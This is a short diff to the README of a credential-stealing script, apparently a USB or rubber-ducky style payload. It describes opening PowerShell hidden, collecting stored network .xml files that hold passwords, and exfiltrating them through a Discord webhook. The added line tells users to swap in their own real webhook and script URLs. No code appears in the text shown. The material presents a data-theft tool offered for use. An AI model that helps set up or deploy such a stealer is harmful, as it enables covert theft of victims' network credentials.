@@ -10,6 +10,7 @@ A script used to steal Network Passwords and more
 Opens PowerShell hidden, grabs network .xml files (containing Passwords and more) and exfiltrates info via Discord Webhook.
 
 ## Getting Started
+Replace the example Variables for the webhook and script url in _Line 19_ and _Line 20_ with your own, real urls.
 
 ### Dependencies
 
